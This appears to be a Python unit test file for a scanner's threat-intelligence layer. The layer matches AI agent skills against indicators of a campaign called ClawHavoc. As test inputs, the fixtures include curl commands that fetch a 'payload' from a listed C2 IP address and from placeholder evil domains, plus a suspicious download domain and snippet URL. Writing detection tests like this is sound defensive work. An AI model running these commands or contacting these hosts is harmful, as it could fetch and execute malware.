# Copyright (c) 2026 Veritas Aequitas Holdings LLC. All rights reserved.
"""Unit tests for the threat intelligence correlator (Layer 4)."""

from __future__ import annotations

from malwar.core.constants import DetectorLayer, Severity, ThreatCategory
from malwar.detectors.threat_intel.detector import ThreatIntelDetector
from malwar.detectors.threat_intel.matcher import (
    HARDCODED_SIGNATURES,
    ThreatIntelMatcher,
)
from malwar.models.finding import Finding
from malwar.models.skill import SkillContent, SkillMetadata
from malwar.scanner.context import ScanContext

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_skill(
    raw_content: str = "# Benign Skill\nHello world\n",
    name: str = "Test Skill",
    author: str = "Tester",
    urls: list[str] | None = None,
    source_url: str | None = None,
    author_url: str | None = None,
) -> SkillContent:
    return SkillContent(
        file_path="<test>",
        raw_content=raw_content,
        metadata=SkillMetadata(
            name=name,
            author=author,
            source_url=source_url,
            author_url=author_url,
        ),
        body_markdown=raw_content,
        urls=urls or [],
    )


def _make_context(skill: SkillContent | None = None) -> ScanContext:
    return ScanContext(
        skill=skill or _make_skill(),
        scan_id="test-scan-001",
    )


def _make_prior_finding(
    ioc_values: list[str] | None = None,
    evidence: list[str] | None = None,
    rule_id: str = "test-rule",
    title: str = "Test finding",
) -> Finding:
    return Finding(
        id="MALWAR-RE-001",
        rule_id=rule_id,
        title=title,
        description="A prior finding for testing.",
        severity=Severity.HIGH,
        confidence=0.9,
        category=ThreatCategory.KNOWN_MALWARE,
        detector_layer=DetectorLayer.RULE_ENGINE,
        ioc_values=ioc_values or [],
        evidence=evidence or [],
    )


# ---------------------------------------------------------------------------
# ThreatIntelMatcher tests
# ---------------------------------------------------------------------------


class TestThreatIntelMatcher:
    """Tests for the ThreatIntelMatcher."""

    def test_exact_match_ip_in_raw_content(self) -> None:
        """Signature matches an IP address found in the skill raw content."""
        skill = _make_skill(raw_content="# Skill\ncurl http://91.92.242.30/payload\n")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        assert len(findings) >= 1
        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-c2-ip" in matched_ids

    def test_exact_match_domain_in_url_list(self) -> None:
        """Signature matches a domain found in the skill's URL list."""
        skill = _make_skill(
            raw_content="# Skill\nVisit the download page.\n",
            urls=["https://download.setup-service.com/agent"],
        )
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-domain" in matched_ids

    def test_exact_match_author(self) -> None:
        """Signature matches the skill author."""
        skill = _make_skill(author="zaycv")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-author-zaycv" in matched_ids

    def test_exact_match_glot_in_evidence(self) -> None:
        """Signature matches an IOC from prior findings evidence."""
        skill = _make_skill()
        prior = _make_prior_finding(evidence=["glot.io/snippets/hfd3x9ueu5"])
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [prior])

        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-glot" in matched_ids

    def test_exact_match_ioc_values(self) -> None:
        """Signature matches an IOC value from prior findings."""
        skill = _make_skill()
        prior = _make_prior_finding(ioc_values=["91.92.242.30"])
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [prior])

        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-c2-ip" in matched_ids

    def test_no_match_for_benign_skill(self) -> None:
        """Benign skill with no IOCs should produce no findings."""
        skill = _make_skill(raw_content="# Hello\nA simple greeting skill.\n")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        # Filter to only signature matches (not from raw content substring matches)
        sig_ids = {f.metadata["signature_id"] for f in findings}
        # None of the ClawHavoc signatures should match
        assert "sig-clawhavoc-c2-ip" not in sig_ids
        assert "sig-clawhavoc-glot" not in sig_ids
        assert "sig-clawhavoc-domain" not in sig_ids

    def test_empty_prior_findings(self) -> None:
        """Empty prior findings should still check skill content."""
        skill = _make_skill(raw_content="# Benign\nJust a benign skill.\n")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        # Should not crash; may return empty or some findings depending on content
        assert isinstance(findings, list)

    def test_custom_signatures(self) -> None:
        """Matcher should use custom signatures when provided."""
        custom_sigs = [
            {
                "id": "custom-sig-1",
                "pattern_type": "exact",
                "pattern_value": "evil-domain.com",
                "severity": "high",
                "category": "malicious_url",
                "campaign": "CustomCampaign",
            },
        ]
        skill = _make_skill(
            raw_content="# Skill\ncurl http://evil-domain.com/payload\n",
        )
        matcher = ThreatIntelMatcher(signatures=custom_sigs)

        findings = matcher.match(skill, [])

        assert len(findings) == 1
        assert findings[0].metadata["signature_id"] == "custom-sig-1"
        assert findings[0].metadata["campaign"] == "CustomCampaign"

    def test_regex_pattern_matching(self) -> None:
        """Matcher should support regex patterns."""
        custom_sigs = [
            {
                "id": "regex-sig-1",
                "pattern_type": "regex",
                "pattern_value": r"evil-\d+\.com",
                "severity": "high",
                "category": "malicious_url",
                "campaign": "RegexCampaign",
            },
        ]
        skill = _make_skill(raw_content="# Skill\ncurl http://evil-42.com/payload\n")
        matcher = ThreatIntelMatcher(signatures=custom_sigs)

        findings = matcher.match(skill, [])

        assert len(findings) == 1
        assert findings[0].metadata["signature_id"] == "regex-sig-1"

    def test_regex_no_match(self) -> None:
        """Regex patterns should not match unrelated content."""
        custom_sigs = [
            {
                "id": "regex-sig-2",
                "pattern_type": "regex",
                "pattern_value": r"evil-\d+\.com",
                "severity": "high",
                "category": "malicious_url",
                "campaign": "RegexCampaign",
            },
        ]
        skill = _make_skill(raw_content="# Benign Skill\nNo evil here.\n")
        matcher = ThreatIntelMatcher(signatures=custom_sigs)

        findings = matcher.match(skill, [])

        assert len(findings) == 0

    def test_finding_has_correct_detector_layer(self) -> None:
        """All findings from threat intel should have THREAT_INTEL layer."""
        skill = _make_skill(raw_content="# Skill\n91.92.242.30\n")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        for f in findings:
            assert f.detector_layer == DetectorLayer.THREAT_INTEL

    def test_finding_has_campaign_metadata(self) -> None:
        """Findings should include campaign attribution in metadata."""
        skill = _make_skill(raw_content="# Skill\ncurl http://91.92.242.30/\n")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        assert any(f.metadata.get("campaign") == "ClawHavoc" for f in findings)

    def test_finding_severity_mapping(self) -> None:
        """Signature severity should be correctly mapped to Finding severity."""
        custom_sigs = [
            {
                "id": "sev-test",
                "pattern_type": "exact",
                "pattern_value": "test-marker",
                "severity": "medium",
                "category": "known_malware",
                "campaign": "TestCampaign",
            },
        ]
        skill = _make_skill(raw_content="# Skill\ntest-marker\n")
        matcher = ThreatIntelMatcher(signatures=custom_sigs)

        findings = matcher.match(skill, [])

        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM

    def test_finding_location_resolved(self) -> None:
        """Finding location should point to the line containing the matched IOC."""
        skill = _make_skill(raw_content="line1\nline2\n91.92.242.30\nline4\n")
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        ip_finding = None
        for f in findings:
            if f.metadata.get("signature_id") == "sig-clawhavoc-c2-ip":
                ip_finding = f
                break
        assert ip_finding is not None
        assert ip_finding.location is not None
        assert ip_finding.location.line_start == 3

    def test_multiple_signatures_match(self) -> None:
        """Multiple signatures should be able to match the same skill."""
        skill = _make_skill(
            raw_content="# Skill\ncurl http://91.92.242.30/payload\nglot.io/snippets/hfd3x9ueu5\n",
            author="zaycv",
        )
        matcher = ThreatIntelMatcher()

        findings = matcher.match(skill, [])

        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-c2-ip" in matched_ids
        assert "sig-clawhavoc-glot" in matched_ids
        assert "sig-clawhavoc-author-zaycv" in matched_ids

    def test_hardcoded_signatures_exist(self) -> None:
        """Verify the hardcoded signature database is populated."""
        assert len(HARDCODED_SIGNATURES) >= 4
        for sig in HARDCODED_SIGNATURES:
            assert "id" in sig
            assert "pattern_type" in sig
            assert "pattern_value" in sig
            assert "severity" in sig
            assert "campaign" in sig


# ---------------------------------------------------------------------------
# ThreatIntelDetector tests
# ---------------------------------------------------------------------------


class TestThreatIntelDetector:
    """Tests for the ThreatIntelDetector."""

    def test_layer_name_and_order(self) -> None:
        detector = ThreatIntelDetector()

        assert detector.layer_name == DetectorLayer.THREAT_INTEL
        assert detector.order == 40

    async def test_detect_with_matching_skill(self) -> None:
        """Detector should find matches and populate context campaigns."""
        skill = _make_skill(
            raw_content="# Bad Skill\ncurl http://91.92.242.30/payload\n"
        )
        context = _make_context(skill=skill)
        detector = ThreatIntelDetector()

        findings = await detector.detect(context)

        assert len(findings) >= 1
        assert "ClawHavoc" in context.matched_campaigns

    async def test_detect_with_benign_skill(self) -> None:
        """Benign skill should produce no campaign matches."""
        skill = _make_skill(raw_content="# Hello\nA friendly greeting.\n")
        context = _make_context(skill=skill)
        detector = ThreatIntelDetector()

        findings = await detector.detect(context)

        # Check that no ClawHavoc signatures matched
        clawhavoc_findings = [
            f for f in findings
            if f.metadata.get("campaign") == "ClawHavoc"
        ]
        assert len(clawhavoc_findings) == 0

    async def test_detect_with_prior_findings(self) -> None:
        """Detector should correlate IOCs from prior findings."""
        skill = _make_skill(raw_content="# Skill\nSome content.\n")
        context = _make_context(skill=skill)

        # Add prior finding with matching IOC
        context.findings.append(
            _make_prior_finding(ioc_values=["download.setup-service.com"])
        )
        detector = ThreatIntelDetector()

        findings = await detector.detect(context)

        matched_ids = {f.metadata["signature_id"] for f in findings}
        assert "sig-clawhavoc-domain" in matched_ids

    async def test_detect_with_custom_signatures(self) -> None:
        """Detector should accept custom signatures."""
        custom_sigs = [
            {
                "id": "custom-1",
                "pattern_type": "exact",
                "pattern_value": "custom-marker",
                "severity": "high",
                "category": "known_malware",
                "campaign": "CustomCampaign",
            },
        ]
        skill = _make_skill(raw_content="# Skill\ncustom-marker\n")
        context = _make_context(skill=skill)
        detector = ThreatIntelDetector(signatures=custom_sigs)

        findings = await detector.detect(context)

        assert len(findings) == 1
        assert "CustomCampaign" in context.matched_campaigns

    async def test_campaigns_not_duplicated(self) -> None:
        """Same campaign should not appear twice in matched_campaigns."""
        skill = _make_skill(
            raw_content="# Skill\n91.92.242.30\nglot.io/snippets/hfd3x9ueu5\n",
        )
        context = _make_context(skill=skill)
        detector = ThreatIntelDetector()

        await detector.detect(context)

        # ClawHavoc should appear at most once
        assert context.matched_campaigns.count("ClawHavoc") <= 1
